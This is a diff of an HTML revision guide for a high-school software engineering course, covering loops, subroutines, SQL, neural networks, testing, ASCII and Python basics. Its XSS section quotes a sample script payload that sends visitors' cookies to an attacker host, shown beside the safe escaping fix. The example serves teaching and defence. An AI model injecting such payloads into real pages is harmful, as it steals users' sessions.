+          <h3>Repetition</h3>
+          <p>Allows a block of statements to execute multiple times. The choice of loop depends on whether the number of iterations is known in advance.</p>
+
+          <h4>Pre-test (WHILE)</h4>
+          <p>Checks the condition <strong>before</strong> each iteration. If the condition is false from the start, the body never executes.</p>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Pseudocode — Validate user input</span></div>
+            <pre><code>INPUT password
+WHILE password != "correct123"
+  OUTPUT "Incorrect password. Try again."
+  INPUT password
+ENDWHILE
+OUTPUT "Access granted."</code></pre>
+          </div>
+
+          <h4>Post-test (REPEAT / UNTIL)</h4>
+          <p>Checks the condition <strong>after</strong> each iteration. The body always executes <strong>at least once</strong>.</p>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Pseudocode — Keep asking until valid input</span></div>
+            <pre><code>REPEAT
+  OUTPUT "Enter a number between 1 and 10: "
+  INPUT number
+UNTIL number >= 1 AND number <= 10
+OUTPUT "You entered: ", number</code></pre>
+          </div>
+
+          <h4>FOR / NEXT (Counted Loop)</h4>
+          <p>Used when the number of iterations is known in advance. The loop variable is automatically incremented each cycle.</p>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Pseudocode — Sum five scores</span></div>
+            <pre><code>total ← 0
+FOR i = 1 TO 5 STEP 1
+  INPUT score
+  total ← total + score
+NEXT i
+average ← total / 5
+OUTPUT "Class average: ", average</code></pre>
+          </div>
+          <div class="callout info">
+            <strong>Choosing the right loop:</strong> Use <code>FOR/NEXT</code> when the count is known. Use <code>WHILE</code> when checking a condition before starting. Use <code>REPEAT/UNTIL</code> when the body must run at least once (e.g. input validation).
           </div>
         </section>
 
-        <!-- ═══════════════════════════════════════════════════════ -->
-        <!--  FOCUS AREA 3: DATA & SOFTWARE SOLUTIONS                 -->
-        <!-- ═══════════════════════════════════════════════════════ -->
-        <div class="part-block">
-          <span class="part-number">Focus Area 3</span>
-          <span class="part-name">🗄️ Data & Software Solutions</span>
-        </div>
+        <hr class="divider" />
 
-        <!-- 6. Relational Databases -->
-        <section id="relational-databases">
-          <h2 class="syllabus-phase">🗄️ Relational Databases (SQL)</h2>
+        <!-- 6. Subroutines -->
+        <section id="subroutines">
+          <h2 class="syllabus-phase">🔧 Subroutines</h2>
+          <p>A subroutine is a named, reusable block of code that performs a specific task. Subroutines promote modularity — breaking a large problem into smaller, manageable pieces.</p>
+          <div class="callout info">
+            <strong>Procedure vs Function:</strong> A <em>procedure (subroutine)</em> performs an action but does not return a value. A <em>function</em> performs a calculation and <strong>returns</strong> a result to the caller.
+          </div>
+
+          <h3>Using a subroutine with one parameter</h3>
+          <p>A parameter is a variable that receives a value when the subroutine is called. The value passed in is called an <em>argument</em>.</p>
           <div class="code-block">
-            <div class="code-header">
-              <span class="code-lang">Standard SQL Syntax</span>
-            </div>
+            <div class="code-header"><span class="code-lang">Pseudocode — Display a greeting</span></div>
+            <pre><code>SUBROUTINE greetStudent(studentName)
+  OUTPUT "Welcome, ", studentName, "!"
+  OUTPUT "Good luck with your HSC."
+END SUBROUTINE
+
+# Calling the subroutine:
+greetStudent("Alice")
+greetStudent("Ben")</code></pre>
+          </div>
+
+          <h3>Using a subroutine with multiple parameters</h3>
+          <p>Multiple parameters are separated by commas. Each argument passed must match the corresponding parameter in position and type.</p>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Pseudocode — Print a student result</span></div>
+            <pre><code>SUBROUTINE displayResult(studentName, score)
+  OUTPUT studentName, " scored ", score, "/100"
+  IF score >= 50 THEN
+    OUTPUT "Result: Pass"
+  ELSE
+    OUTPUT "Result: Fail"
+  ENDIF
+END SUBROUTINE
+
+# Calling the subroutine:
+displayResult("Alice", 87)
+displayResult("Ben", 43)</code></pre>
+          </div>
+
+          <h3>Passing a value back from a function</h3>
+          <p>A function uses <code>RETURN</code> to send a computed value back to the line that called it. The returned value can be stored in a variable or used directly in an expression.</p>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Pseudocode — Calculate letter grade</span></div>
+            <pre><code>FUNCTION getGrade(score)
+  IF score >= 90 THEN
+    RETURN "A"
+  ELSE IF score >= 75 THEN
+    RETURN "B"
+  ELSE IF score >= 50 THEN
+    RETURN "C"
+  ELSE
+    RETURN "Fail"
+  ENDIF
+END FUNCTION
+
+# Calling the function:
+grade ← getGrade(82)
+OUTPUT "Your grade is: ", grade    # Your grade is: B</code></pre>
+          </div>
+        </section>
+
+        <hr class="divider" />
+
+        <!-- 7. Relational Databases -->
+        <section id="relational-databases">
+          <h2 class="syllabus-phase">🗄️ Relational Databases</h2>
+
+          <h3>SQL</h3>
+          <p>Structured Query Language (SQL) is the standard language for interacting with relational databases. A relational database stores data in <strong>tables</strong> (relations), where each row is a record and each column is a field.</p>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">SQL — Standard Syntax</span></div>
             <pre><code>SELECT field(s)
 FROM table(s)
 WHERE search criteria
 GROUP BY field(s)
 ORDER BY field(s) ASC/DESC</code></pre>
           </div>
-          <p>Includes functions like <code>SUM</code>, <code>AVG</code>, <code>COUNT</code>, <code>MAX</code>, <code>MIN</code> and operators like <code>CONTAINS</code>, <code>EQUALS</code>, <code>AND</code>, <code>OR</code>, <code>NOT</code>.</p>
-        </section>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">SQL — Worked Examples</span></div>
+            <pre><code>-- Get all students with a score above 80, sorted highest first
+SELECT studentID, surname, score
+FROM Students
+WHERE score > 80
+ORDER BY score DESC;
 
-        <hr class="divider" />
+-- Count how many students passed each subject
+SELECT subjectName, COUNT(*) AS numPassing
+FROM Enrolments
+WHERE score >= 50
+GROUP BY subjectName
+ORDER BY numPassing DESC;
 
-        <!-- 7. Testing & Representation -->
-        <section id="testing-methods">
-          <h2 class="syllabus-phase">⚙️ Methods for Testing and Representation</h2>
-          <h3>⚙️ Testing Methods</h3>
+-- Join two tables: get student names with their subject enrolments
+SELECT Students.surname, Subjects.subjectName, Enrolments.score
+FROM Students
+JOIN Enrolments ON Students.studentID = Enrolments.studentID
+JOIN Subjects ON Enrolments.subjectID = Subjects.subjectID
+WHERE Enrolments.score >= 50;</code></pre>
+          </div>
           <div class="key-terms">
-            <div class="key-term-item"><strong>🔧 Functional</strong><span>Verifies the system operates according to its functional requirements and produces expected outputs.</span></div>
-            <div class="key-term-item"><strong>✅ Acceptance</strong><span>Determines whether the system meets stakeholder requirements and is ready for deployment.</span></div>
-            <div class="key-term-item"><strong>📡 Live Data</strong><span>Tests using real-world production data to identify issues in a live environment.</span></div>
-            <div class="key-term-item"><strong>🎲 Simulated Data</strong><span>Uses artificially generated data that mirrors expected real-world scenarios.</span></div>
-            <div class="key-term-item"><strong>🧑‍💻 Beta</strong><span>Releases the product to a limited group of real users to identify bugs before full release.</span></div>
-            <div class="key-term-item"><strong>📦 Volume</strong><span>Evaluates system performance under large amounts of data to test scalability.</span></div>
+            <div class="key-term-item"><strong>SUM / AVG / COUNT / MAX / MIN</strong><span>Aggregate functions that operate on a set of rows (e.g. <code>AVG(score)</code>).</span></div>
+            <div class="key-term-item"><strong>AND / OR / NOT</strong><span>Logical operators to combine conditions in a WHERE clause.</span></div>
+            <div class="key-term-item"><strong>JOIN</strong><span>Combines rows from two or more tables based on a matching key field.</span></div>
+            <div class="key-term-item"><strong>PRIMARY KEY</strong><span>A field (or combination) that uniquely identifies each row in a table.</span></div>
+            <div class="key-term-item"><strong>FOREIGN KEY</strong><span>A field in one table that references the primary key of another, creating a relationship.</span></div>
           </div>
 
-          <h3>🧠 Character Representation</h3>
-          <p>Characters are represented using <strong>ASCII</strong> or <strong>Unicode</strong>. Developers use binary internal formats for functions like case conversion or simple encryption.</p>
-        </section>
+          <h3>Object-Relational Mapping (ORM)</h3>
+          <p>ORM is a programming technique that allows a developer to interact with a relational database using <strong>objects</strong> rather than raw SQL. The ORM framework automatically generates the SQL behind the scenes.</p>
+          <div class="key-terms">
+            <div class="key-term-item"><strong>Class → Table</strong><span>Each class in the object model corresponds to a database table.</span></div>
+            <div class="key-term-item"><strong>Attribute → Column</strong><span>Each attribute of the class becomes a column in the table.</span></div>
+            <div class="key-term-item"><strong>Object → Row</strong><span>Each instance of the class is stored as a row (record) in the table.</span></div>
+          </div>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Python — ORM-style example (SQLAlchemy)</span></div>
+            <pre><code># The class maps directly to the "students" database table
+class Student(Base):
+    __tablename__ = 'students'
+    studentID = Column(Integer, primary_key=True)
+    surname   = Column(String(50))
+    score     = Column(Float)
 
-        <!-- ═══════════════════════════════════════════════════════ -->
-        <!--  FOCUS AREA 4: MECHATRONICS & EMERGING TECHNOLOGIES      -->
-        <!-- ═══════════════════════════════════════════════════════ -->
-        <div class="part-block">
-          <span class="part-number">Focus Area 4</span>
-          <span class="part-name">🤖 Mechatronics & Emerging Technologies</span>
-        </div>
-
-        <!-- 8. Mechatronics Wiring -->
-        <section id="mechatronics">
-          <h2 class="syllabus-phase">🦾 Wiring Diagrams for Mechatronics</h2>
-          <p>Standard symbols for electronic components:</p>
-          <div class="info-grid">
-            <div class="info-card"><h4>📚 Capacitor, Diode, Resistor</h4></div>
-            <div class="info-card"><h4>🚀 LED, Lightbulb, Amplifier</h4></div>
-            <div class="info-card"><h4>🌐 Motor, Speaker, Integrated Circuit</h4></div>
-            <div class="info-card"><h4>🔐 Voltage Source (AC/DC)</h4></div>
+# Query using objects instead of SQL strings
+passing = session.query(Student).filter(Student.score >= 50).all()
+for s in passing:
+    print(s.surname, s.score)</code></pre>
           </div>
         </section>
 
         <hr class="divider" />
 
-        <!-- 9. Web & Machine Learning -->
-        <section id="web-machine-learning">
-          <h2 class="syllabus-phase">🌐 Web and Machine Learning</h2>
-          <h3>🌐 Programming for the Web</h3>
-          <ul>
-            <li>Front-end frameworks (React, Vue, etc.)</li>
-            <li>Cross-site scripting (XSS) prevention and sanitisation.</li>
-            <li>CSS Syntax (Selectors, Properties, Values).</li>
-          </ul>
+        <!-- 8. Wiring Diagrams for Mechatronic Systems -->
+        <section id="mechatronics">
+          <h2 class="syllabus-phase">🦾 Wiring Diagrams for Mechatronic Systems</h2>
+          <p>Wiring diagrams use standardised schematic symbols to represent electronic components and their connections. They show how components are electrically connected in a circuit — different from a physical layout diagram.</p>
+          <div class="info-grid">
+            <div class="info-card">
+              <h4>⚡ Resistor</h4>
+              <p>Limits current flow. Shown as a rectangle or zigzag line. Value measured in Ohms (Ω).</p>
+            </div>
+            <div class="info-card">
+              <h4>🔋 Capacitor</h4>
+              <p>Stores electrical charge temporarily. Shown as two parallel lines. Value in Farads (F).</p>
+            </div>
+            <div class="info-card">
+              <h4>➡️ Diode / LED</h4>
+              <p>Allows current to flow in one direction only. LED emits light when conducting. Shown as a triangle pointing to a line.</p>
+            </div>
+            <div class="info-card">
+              <h4>🔌 Voltage Source</h4>
+              <p>Provides electrical potential. DC shown as long/short parallel lines; AC shown as a circle with a wave symbol.</p>
+            </div>
+            <div class="info-card">
+              <h4>🔊 Speaker / Motor</h4>
+              <p>Output transducers — convert electrical energy to sound (speaker) or mechanical motion (motor).</p>
+            </div>
+            <div class="info-card">
+              <h4>🧩 Integrated Circuit (IC)</h4>
+              <p>A chip containing many transistors and logic gates. Shown as a rectangle with labelled input/output pins.</p>
+            </div>
+          </div>
+          <div class="callout info">
+            <strong>Tracing a circuit — LED with current-limiting resistor:</strong><br><br>
+            <code>+5V → [Resistor 220Ω] → [LED Anode (+)] → [LED Cathode (−)] → GND</code><br><br>
+            In wiring diagrams, always trace from the <strong>positive supply (VCC/5V)</strong> through each component in series to <strong>ground (GND)</strong>. The resistor limits current so the LED doesn't burn out (LEDs typically need 20mA at 2V forward voltage; at 5V supply: R = (5 − 2) / 0.02 = <strong>150Ω minimum</strong> — 220Ω is the standard safe choice).<br><br>
+            In Arduino projects: digital output pin → resistor → LED → GND. When the pin outputs HIGH (5V), current flows and the LED illuminates.
+          </div>
+        </section>
 
-          <h3>📋 Machine Learning (MLOps)</h3>
-          <p>The three stages of MLOps:</p>
-          <ol>
-            <li><strong>Design</strong>: Problem definition, metrics, data research.</li>
-            <li><strong>Model Development</strong>: Wrangling, engineering, training, validation.</li>
-            <li><strong>Operations</strong>: Deployment, monitoring, performance.</li>
-          </ol>
+        <hr class="divider" />
+
+        <!-- 9. Programming for the Web -->
+        <section id="web-programming">
+          <h2 class="syllabus-phase">🌐 Programming for the Web</h2>
+
+          <h3>Front-end web development frameworks</h3>
+          <p>Front-end frameworks provide pre-built, reusable components and a structured approach to building user interfaces in the browser. Rather than writing all HTML/CSS/JS from scratch, developers compose interfaces from components.</p>
+          <div class="key-terms">
+            <div class="key-term-item"><strong>React</strong><span>A JavaScript library by Meta for building component-based UIs. Uses a virtual DOM for efficient updates.</span></div>
+            <div class="key-term-item"><strong>Vue</strong><span>A progressive framework that is lightweight and easy to integrate into existing projects.</span></div>
+            <div class="key-term-item"><strong>Angular</strong><span>A full framework by Google that includes routing, state management, and dependency injection built in.</span></div>
+          </div>
+          <div class="callout info">
+            <strong>Framework vs Library:</strong> A <em>library</em> (like React) is called by your code when you need it. A <em>framework</em> (like Angular) calls your code — it provides the overall structure and you fill in the details.
+          </div>
+
+          <h3>Cross-site scripting (XSS)</h3>
+          <p>XSS is a web security vulnerability where an attacker injects malicious client-side scripts into web pages that other users then view. The injected script runs in the victim's browser with the same trust level as the legitimate site.</p>
+          <div class="callout warning">
+            <strong>Attack scenario:</strong> A forum site displays user comments without sanitising them. An attacker posts a comment containing a <code>&lt;script&gt;</code> tag. Every visitor who loads the page runs the script in their own browser — the attacker can steal session cookies, redirect users, or log keystrokes.
+          </div>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">XSS — Vulnerable vs Safe output (Python Flask)</span></div>
+            <pre><code># VULNERABLE — user input rendered directly as HTML:
+comment = request.form['comment']
+return f"&lt;p&gt;{comment}&lt;/p&gt;"
+# If comment = &lt;script&gt;document.location='https://evil.com?c='+document.cookie&lt;/script&gt;
+# → every visitor's cookie is sent to the attacker
+
+# SAFE — escape special characters before rendering:
+from markupsafe import escape
+safe_comment = escape(comment)
+return f"&lt;p&gt;{safe_comment}&lt;/p&gt;"
+# &lt;script&gt; becomes &amp;lt;script&amp;gt; — displayed as text, never executed</code></pre>
+          </div>
+          <div class="callout success">
+            <strong>Mitigation checklist:</strong>
+            (1) <strong>Escape output</strong> — convert <code>&lt; &gt; &amp; " '</code> to HTML entities before rendering any user-supplied content.<br>
+            (2) <strong>Validate input server-side</strong> — reject input that doesn't match an expected format or whitelist.<br>
+            (3) <strong>Content Security Policy (CSP)</strong> — set a response header restricting which scripts may execute on your page.
+          </div>
+          <div class="key-terms">
+            <div class="key-term-item"><strong>Escaping output</strong><span>Convert special characters (<code>&lt; &gt; &amp; " '</code>) to HTML entities so they render as text rather than being parsed as markup.</span></div>
+            <div class="key-term-item"><strong>Input validation</strong><span>Reject or sanitise input that doesn't match expected formats on the server side (never rely on client-side validation alone).</span></div>
+            <div class="key-term-item"><strong>Content Security Policy</strong><span>An HTTP response header that tells the browser which sources of script are trusted — blocking injected inline scripts even if they reach the page.</span></div>
+          </div>
+
+          <h3>Cascading Style Sheets (CSS)</h3>
+          <p>CSS describes the visual presentation of HTML documents — colours, layout, fonts, and spacing. Styles <em>cascade</em>: more specific rules override more general ones.</p>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">CSS — Syntax and Examples</span></div>
+            <pre><code>/* Syntax: selector { property: value; } */
+
+/* Element selector — targets all &lt;p&gt; tags */
+p {
+  font-size: 16px;
+  color: #333333;
+  line-height: 1.6;
+}
+
+/* Class selector — targets elements with class="highlight" */
+.highlight {
+  background-color: yellow;
+  font-weight: bold;
+}
+
+/* ID selector — targets the unique element with id="header" */
+#header {
+  background-color: #2c3e50;
+  padding: 20px;
+  text-align: center;
+}
+
+/* Descendant selector — targets &lt;a&gt; inside .nav */
+.nav a {
+  color: white;
+  text-decoration: none;
+}</code></pre>
+          </div>
+          <div class="key-terms">
+            <div class="key-term-item"><strong>Selector</strong><span>Targets which element(s) to style: element (<code>p</code>), class (<code>.name</code>), ID (<code>#name</code>), or descendant (<code>div p</code>).</span></div>
+            <div class="key-term-item"><strong>Property</strong><span>The visual attribute to change: <code>color</code>, <code>font-size</code>, <code>margin</code>, <code>padding</code>, <code>display</code>.</span></div>
+            <div class="key-term-item"><strong>Value</strong><span>The setting for that property: <code>red</code>, <code>16px</code>, <code>1em</code>, <code>auto</code>, <code>#ff0000</code>.</span></div>
+            <div class="key-term-item"><strong>Specificity</strong><span>More specific selectors win: ID > class > element. Inline styles override all.</span></div>
+          </div>
+        </section>
+
+        <hr class="divider" />
+
+        <!-- 10. Machine Learning -->
+        <section id="machine-learning">
+          <h2 class="syllabus-phase">🤖 Machine Learning</h2>
+          <p>Machine learning (ML) enables systems to learn patterns from data and make predictions or decisions without being explicitly programmed for each case.</p>
+
+          <h3>Machine learning automation through DevOps (MLOps)</h3>
+          <p>MLOps integrates ML workflows with software engineering and DevOps practices to make model development and deployment reliable and repeatable. Three stages:</p>
+          <div class="key-terms">
+            <div class="key-term-item"><strong>1. Design</strong><span>Define the problem, choose success metrics, and research available data sources. Determine whether ML is the right solution.</span></div>
+            <div class="key-term-item"><strong>2. Model Development</strong><span>Collect and clean data (wrangling), select features (feature engineering), train the model, then validate and tune it.</span></div>
+            <div class="key-term-item"><strong>3. Operations</strong><span>Deploy the trained model to production, monitor its real-world performance, and retrain when the model degrades over time.</span></div>
+          </div>
+
+          <h3>Regression algorithms</h3>
+          <p>Supervised learning algorithms that predict a <strong>continuous numerical output</strong> from input features. The algorithm learns the mapping between inputs and outputs from labelled training data.</p>
+          <div class="key-terms">
+            <div class="key-term-item"><strong>Linear Regression</strong><span>Fits a straight line to the data: <code>y = mx + b</code>. Example: predicting a student's final exam score from hours studied.</span></div>
+            <div class="key-term-item"><strong>Multiple Linear Regression</strong><span>Extends to multiple input features: <code>y = m₁x₁ + m₂x₂ + … + b</code>. Example: predicting house price from size, location, and age.</span></div>
+            <div class="key-term-item"><strong>Logistic Regression</strong><span>Despite the name, used for <em>classification</em> — outputs a probability between 0 and 1. Example: spam or not spam.</span></div>
+            <div class="key-term-item"><strong>Polynomial Regression</strong><span>Fits a curved line by adding powers of features (x², x³, …). Used when data has a non-linear relationship.</span></div>
+          </div>
+
+          <h3>Neural Networks</h3>
+          <p>Computational models loosely inspired by the brain, composed of <strong>layers of interconnected nodes (neurons)</strong>. Each connection has a weight that is adjusted during training.</p>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Neural Network — Architecture</span></div>
+            <pre><code>Input Layer          Hidden Layer 1       Hidden Layer 2       Output Layer
+(4 features)         (5 neurons)          (3 neurons)          (2 classes)
+
+  x₁ ──────────────→ ◉ ──────────────→  ◉ ──────────────→  ◉ → P(Spam)
+  x₂ ─────────╮   ╭→ ◉ ──────────╮  ╭→ ◉ ──────────╮       ◉ → P(Not Spam)
+  x₃ ────╮    ╰───╯  ◉            ╰──╯  ◉            ╰──────╯
+  x₄ ────╰─────────→ ◉ ──────────────→  ◉
+                      ◉
+
+  Each → represents a weighted connection.
+  The output layer uses softmax — probabilities sum to 1.0.</code></pre>
+          </div>
+          <div class="key-terms">
+            <div class="key-term-item"><strong>Input layer</strong><span>Receives the raw input features (e.g. pixel values of an image, or sensor readings). One node per feature.</span></div>
+            <div class="key-term-item"><strong>Hidden layer(s)</strong><span>One or more intermediate layers that learn to detect patterns automatically. "Deep learning" refers to networks with many hidden layers.</span></div>
+            <div class="key-term-item"><strong>Output layer</strong><span>Produces the final prediction. For binary classification: 1 node. For n classes: n nodes. For regression: 1 node (continuous value).</span></div>
+            <div class="key-term-item"><strong>Weights &amp; biases</strong><span>Numerical parameters on each connection; adjusted during training to minimise prediction error.</span></div>
+            <div class="key-term-item"><strong>Activation function</strong><span>Introduces non-linearity at each neuron (e.g. ReLU, Sigmoid) — without it, deep networks reduce to simple linear regression.</span></div>
+          </div>
+
+          <h4>Training cycle</h4>
+          <p>Repeated many times (each complete pass through training data is called an <em>epoch</em>) until the model's error is minimised.</p>
+          <div class="key-terms">
+            <div class="key-term-item"><strong>1. Forward pass</strong><span>Input data flows through the network layer by layer to produce a prediction.</span></div>
+            <div class="key-term-item"><strong>2. Loss calculation</strong><span>A loss function (e.g. mean squared error) measures how far the prediction is from the expected output.</span></div>
+            <div class="key-term-item"><strong>3. Backpropagation</strong><span>The loss gradient is computed and propagated backwards through the network to find each weight's contribution to the error.</span></div>
+            <div class="key-term-item"><strong>4. Weight update</strong><span>An optimiser (e.g. gradient descent) nudges weights in the direction that reduces the loss.</span></div>
+          </div>
+
+          <h4>Execution cycle (Inference)</h4>
+          <div class="key-terms">
+            <div class="key-term-item"><strong>Inference</strong><span>The trained model receives new, unseen input and performs a forward pass to generate a prediction. No weight updates occur.</span></div>
+            <div class="key-term-item"><strong>Deployment</strong><span>The model is packaged and integrated into an application or API so end users can benefit from its predictions in real time.</span></div>
+          </div>
+        </section>
+
+        <hr class="divider" />
+
+        <!-- 11. Methods for Testing a System -->
+        <section id="testing-methods">
+          <h2 class="syllabus-phase">🧪 Methods for Testing a System</h2>
+          <p>Testing verifies that a system behaves correctly and meets its requirements. Different testing methods serve different purposes at different stages of development.</p>
+          <div class="key-terms">
+            <div class="key-term-item"><strong>🔧 Functional testing</strong><span>Verifies the system produces the correct output for a given input, according to its functional requirements. Tests specific features in isolation.</span></div>
+            <div class="key-term-item"><strong>✅ Acceptance testing</strong><span>Conducted with stakeholders to confirm the system meets agreed requirements. The final check before deployment.</span></div>
+            <div class="key-term-item"><strong>📡 Live data testing</strong><span>Tests using real-world production data in a staging environment, revealing issues that only emerge with authentic data patterns.</span></div>
+            <div class="key-term-item"><strong>🎲 Simulated data testing</strong><span>Uses artificially generated data to test scenarios that may be rare or impossible to reproduce with live data (e.g. edge cases, extreme values).</span></div>
+            <div class="key-term-item"><strong>🧑‍💻 Beta testing</strong><span>Releases the product to a limited group of real users before full launch to identify usability issues and bugs in realistic conditions.</span></div>
+            <div class="key-term-item"><strong>📦 Volume testing</strong><span>Evaluates system performance under large quantities of data to identify scalability and performance bottlenecks.</span></div>
+          </div>
+
+          <h3>Test Data Categories</h3>
+          <p>When designing test cases, you should always include data from three categories:</p>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr><th>Category</th><th>Test Input</th><th>Expected Result</th><th>Reason</th></tr>
+              </thead>
+              <tbody>
+                <tr><td><strong>Valid — normal</strong></td><td><code>50</code></td><td>Accepted — "Score recorded"</td><td>Middle of valid range</td></tr>
+                <tr><td><strong>Valid — normal</strong></td><td><code>85</code></td><td>Accepted — "Score recorded"</td><td>Within range, typical value</td></tr>
+                <tr><td><strong>Boundary — lower limit</strong></td><td><code>0</code></td><td>Accepted — "Score recorded"</td><td>Exactly at minimum</td></tr>
+                <tr><td><strong>Boundary — upper limit</strong></td><td><code>100</code></td><td>Accepted — "Score recorded"</td><td>Exactly at maximum</td></tr>
+                <tr><td><strong>Boundary — just below min</strong></td><td><code>-1</code></td><td>Rejected — "Score must be 0–100"</td><td>One below minimum (off-by-one check)</td></tr>
+                <tr><td><strong>Boundary — just above max</strong></td><td><code>101</code></td><td>Rejected — "Score must be 0–100"</td><td>One above maximum (off-by-one check)</td></tr>
+                <tr><td><strong>Invalid — wrong type</strong></td><td><code>"abc"</code></td><td>Rejected — "Must enter a number"</td><td>String input where integer expected</td></tr>
+                <tr><td><strong>Invalid — extreme</strong></td><td><code>9999</code></td><td>Rejected — "Score must be 0–100"</td><td>Far outside valid range</td></tr>
+              </tbody>
+            </table>
+          </div>
+          <div class="callout info">
+            <strong>Exam tip:</strong> Always test at the boundary values and one step either side of them. Off-by-one errors (e.g. using <code>&gt;</code> instead of <code>&gt;=</code>) are one of the most common programming bugs and will only be caught by boundary test data.
+          </div>
+        </section>
+
+        <hr class="divider" />
+
+        <!-- 12. Character Representation -->
+        <section id="character-representation">
+          <h2 class="syllabus-phase">🔣 Character Representation</h2>
+          <p>Computers store text by mapping each character to a numeric code, which is then stored in binary. The encoding standard used determines which number corresponds to which character.</p>
+          <div class="key-terms">
+            <div class="key-term-item"><strong>ASCII</strong><span>American Standard Code for Information Interchange. A 7-bit encoding representing 128 characters: uppercase letters (A–Z), lowercase (a–z), digits (0–9), punctuation, and control codes.</span></div>
+            <div class="key-term-item"><strong>Unicode</strong><span>An international standard that assigns a unique code point to over 140,000 characters, covering most of the world's writing systems including emojis.</span></div>
+            <div class="key-term-item"><strong>UTF-8</strong><span>The most common Unicode encoding on the web. Uses 1–4 bytes per character. Fully backwards-compatible with ASCII (characters 0–127 use the same byte values).</span></div>
+          </div>
+
+          <h3>Character code examples</h3>
+          <div class="table-wrap">
+            <table>
+              <thead>
+                <tr><th>Character</th><th>ASCII Decimal</th><th>Hexadecimal</th><th>Binary (8-bit)</th></tr>
+              </thead>
+              <tbody>
+                <tr><td><code>A</code></td><td>65</td><td>0x41</td><td>0100 0001</td></tr>
+                <tr><td><code>B</code></td><td>66</td><td>0x42</td><td>0100 0010</td></tr>
+                <tr><td><code>a</code></td><td>97</td><td>0x61</td><td>0110 0001</td></tr>
+                <tr><td><code>z</code></td><td>122</td><td>0x7A</td><td>0111 1010</td></tr>
+                <tr><td><code>0</code></td><td>48</td><td>0x30</td><td>0011 0000</td></tr>
+                <tr><td><code>Space</code></td><td>32</td><td>0x20</td><td>0010 0000</td></tr>
+              </tbody>
+            </table>
+          </div>
+          <div class="callout info">
+            <strong>Case conversion trick:</strong> Notice that <code>'A'</code> = 65 and <code>'a'</code> = 97 — a difference of exactly 32 (0b00100000). To convert uppercase to lowercase in binary, you simply set bit 5 to 1. This is why character encoding matters to developers beyond just storing text.
+          </div>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Python — Character encoding examples</span></div>
+            <pre><code># Convert between characters and their ASCII codes
+print(ord('A'))        # → 65
+print(ord('a'))        # → 97
+print(chr(65))         # → 'A'
+print(chr(90))         # → 'Z'
+
+# Case conversion using the 32-bit difference
+upper = 'H'
+lower = chr(ord(upper) + 32)   # 72 + 32 = 104 → 'h'
+print(lower)                   # → 'h'
+
+# Simple Caesar cipher — shift each letter by 3
+message = "HELLO"
+ciphertext = ""
+for ch in message:
+    shifted = chr(ord(ch) + 3)
+    ciphertext += shifted
+print(ciphertext)    # → 'KHOOR'
+
+# Check if a character is uppercase, lowercase, or digit
+ch = 'G'
+if 65 <= ord(ch) <= 90:
+    print(f"{ch} is uppercase")
+elif 97 <= ord(ch) <= 122:
+    print(f"{ch} is lowercase")
+elif 48 <= ord(ch) <= 57:
+    print(f"{ch} is a digit")</code></pre>
+          </div>
+        </section>
+
+        <hr class="divider" />
+
+        <!-- 13. Programming with Python -->
+        <section id="python">
+          <h2 class="syllabus-phase">🐍 Programming with Python</h2>
+          <p>Python is the primary programming language for the HSC Software Engineering course. It uses indentation (not braces) to define code blocks, and reads like English.</p>
+
+          <h3>Variables, Input &amp; Output</h3>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Python</span></div>
+            <pre><code># Variables are dynamically typed — no need to declare a type
+name = "Alice"
+age = 17
+score = 87.5
+is_passing = True
+
+# Getting input from the user (always returns a string)
+name = input("Enter your name: ")
+age = int(input("Enter your age: "))    # Convert to integer
+score = float(input("Enter score: "))   # Convert to float
+
+# Output
+print("Hello,", name)
+print(f"Score: {score:.1f}/100")        # f-string with 1 decimal place</code></pre>
+          </div>
+
+          <h3>Selection</h3>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Python</span></div>
+            <pre><code># Binary selection
+if score >= 50:
+    print("Pass")
+else:
+    print("Fail")
+
+# Multi-way selection (elif chain)
+if score >= 90:
+    grade = "A"
+elif score >= 75:
+    grade = "B"
+elif score >= 50:
+    grade = "C"
+else:
+    grade = "Fail"
+print(f"Grade: {grade}")</code></pre>
+          </div>
+
+          <h3>Repetition</h3>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Python</span></div>
+            <pre><code># for loop — counted repetition (range gives 1, 2, 3, 4, 5)
+total = 0
+for i in range(1, 6):
+    score = int(input(f"Enter score {i}: "))
+    total += score
+average = total / 5
+print(f"Average: {average}")
+
+# while loop — condition-controlled (pre-test)
+password = input("Enter password: ")
+while password != "secret123":
+    print("Incorrect. Try again.")
+    password = input("Enter password: ")
+print("Access granted.")</code></pre>
+          </div>
+
+          <h3>Functions</h3>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Python</span></div>
+            <pre><code># Procedure — performs an action, no return value
+def display_result(name, score):
+    print(f"{name}: {score}/100")
+    if score >= 50:
+        print("  → Pass")
+    else:
+        print("  → Fail")
+
+# Function — returns a computed value
+def calculate_grade(score):
+    if score >= 90:
+        return "A"
+    elif score >= 75:
+        return "B"
+    elif score >= 50:
+        return "C"
+    else:
+        return "Fail"
+
+# Calling them
+display_result("Alice", 87)
+grade = calculate_grade(87)
+print(f"Grade: {grade}")     # Grade: B</code></pre>
+          </div>
+
+          <h3>Lists &amp; Iteration</h3>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Python</span></div>
+            <pre><code>scores = [85, 92, 78, 64, 90]
+
+# Access by index (0-based)
+print(scores[0])    # 85
+print(scores[-1])   # 90 (last element)
+
+# Common list operations
+scores.append(77)         # Add to end
+scores.sort()             # Sort ascending
+scores.sort(reverse=True) # Sort descending
+highest = max(scores)
+lowest = min(scores)
+average = sum(scores) / len(scores)
+
+# Iterate over a list
+for s in scores:
+    print(s, end=" ")    # 92 90 85 78 77 64
+
+# List comprehension — filter passing scores
+passing = [s for s in scores if s >= 50]</code></pre>
+          </div>
+
+          <h3>File I/O</h3>
+          <div class="code-block">
+            <div class="code-header"><span class="code-lang">Python</span></div>
